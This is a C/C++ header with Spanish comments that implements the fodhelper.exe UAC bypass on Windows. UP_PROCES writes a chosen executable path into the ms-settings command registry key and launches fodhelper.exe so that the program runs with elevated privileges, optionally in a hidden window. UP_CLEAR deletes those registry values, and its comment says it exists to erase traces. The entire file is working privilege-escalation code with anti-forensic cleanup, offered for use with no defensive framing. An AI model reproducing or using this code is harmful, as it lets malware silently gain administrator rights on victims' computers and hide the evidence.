#ifndef UP_H
#define UP_H

#include <windows.h>

/**
 * @brief Ejecuta un proceso con privilegios elevados utilizando el exploit de 'fodhelper.exe'.
 *
 * @param PATH Ruta completa del ejecutable que se desea ejecutar.
 * @param HIDE Indica si la ventana del proceso debe mostrarse (SW_NORMAL) o no (SW_HIDE).
 * @return true Si el proceso se ejecutó correctamente.
 * @return false Si hubo algún error en el proceso.
 */
bool UP_PROCES(const char *PATH, bool HIDE = false)
{
    // Variables para la configuración del registro
    HKEY key;
    DWORD infoSys;
    const char *regPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command"; // Ruta de la clave del registro
    const char *delegateExecute = "";                                             // Valor vacío para DelegateExecute
    bool check = false;                                                           // Indica el resultado de la ejecución

    // Paso 1: Abrir o crear la clave del registro donde se almacenará el comando
    LSTATUS claveRegistro = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)regPath, 0, NULL, 0, KEY_WRITE, NULL, &key, NULL);
    if (claveRegistro != ERROR_SUCCESS)
    {
        // Retornar false si no se pudo crear o abrir la clave del registro
        return check;
    }

    // Paso 2: Establecer el valor del comando en la clave de registro
    claveRegistro = RegSetValueEx(key, (LPCSTR) "", 0, REG_SZ, (const BYTE *)PATH, strlen(PATH) + 1);
    if (claveRegistro != ERROR_SUCCESS)
    {
        // Cerrar la clave y retornar false en caso de error
        RegCloseKey(key);
        return check;
    }

    // Paso 3: Establecer el valor DelegateExecute como cadena vacía
    claveRegistro = RegSetValueEx(key, (LPCSTR) "DelegateExecute", 0, REG_SZ, (const unsigned char *)delegateExecute, strlen(delegateExecute));
    if (claveRegistro != ERROR_SUCCESS)
    {
        RegCloseKey(key);
        return check;
    }

    // Cerrar la clave del registro
    RegCloseKey(key);

    // Paso 4: Configurar SHELLEXECUTEINFO para ejecutar 'fodhelper.exe' con privilegios elevados
    SHELLEXECUTEINFO Configuracion = {sizeof(Configuracion)};
    Configuracion.lpVerb = (LPCSTR) "runas";                                // Ejecutar como administrador
    Configuracion.lpFile = (LPCSTR) "C:\\Windows\\System32\\fodhelper.exe"; // Ejecutable con privilegios elevados
    Configuracion.hwnd = NULL;
    Configuracion.nShow = (HIDE) ? SW_NORMAL : SW_HIDE; // Mostrar o esconder la ventana del proceso

    // Ejecutar el proceso utilizando ShellExecuteEx
    if (!ShellExecuteEx(&Configuracion))
    {
        // Retornar false si la ejecución falla
        return check;
    }
    else
    {
        // Retornar true si la ejecución fue exitosa
        return true;
    }
}

/**
 * @brief Limpia los rastros del proceso eliminando las entradas en el registro.
 *
 * @return true Si la operación de limpieza fue exitosa.
 * @return false Si ocurrió algún error durante la limpieza.
 */
bool UP_CLEAR()
{
    const char *regPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command"; // Ruta de la clave del registro
    HKEY key;

    // Intentar abrir la clave del registro para eliminar los valores establecidos
    LSTATUS estado = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)regPath, 0, KEY_SET_VALUE, &key);
    if (estado != ERROR_SUCCESS)
    {
        // Retornar false si no se pudo abrir la clave
        return false;
    }

    // Eliminar el valor de la clave (comando)
    estado = RegDeleteValue(key, (LPCSTR) "");
    if (estado != ERROR_SUCCESS)
    {
        RegCloseKey(key);
        return false;
    }

    // Eliminar el valor DelegateExecute
    estado = RegDeleteValue(key, (LPCSTR) "DelegateExecute");
    if (estado != ERROR_SUCCESS)
    {
        RegCloseKey(key);
        return false;
    }

    // Cerrar la clave del registro
    RegCloseKey(key);
    return true; // Operación exitosa
}

#endif // UP_H
